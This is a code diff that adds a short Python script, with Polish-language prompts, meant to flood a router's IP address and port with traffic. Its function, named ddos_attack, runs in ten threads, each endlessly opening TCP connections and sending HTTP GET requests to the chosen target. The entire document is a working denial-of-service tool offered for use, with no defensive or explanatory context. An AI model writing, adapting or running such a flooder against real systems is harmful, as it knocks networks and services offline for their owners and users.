@@ -1,0 +1,25 @@
+import socket
+import threading
+import sys
+target_ip = sys.argv[1] if len(sys.argv) > 1 else input("Podaj adres IP routera: ")
+target_port = int(sys.argv[2]) if len(sys.argv) > 2 else int(input("Podaj port: "))
+
+def ddos_attack():
+    while True:
+        try:
+            
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target_ip, target_port))
+            s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
+            s.sendto(("Host: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
+            s.close()
+            print("Sukces")
+        except socket.error as e:
+            print(f"Błąd połączenia: {e}")
+
+num_threads = 10
+
+
+for i in range(num_threads):
+    thread = threading.Thread(target=ddos_attack)
+    thread.start()
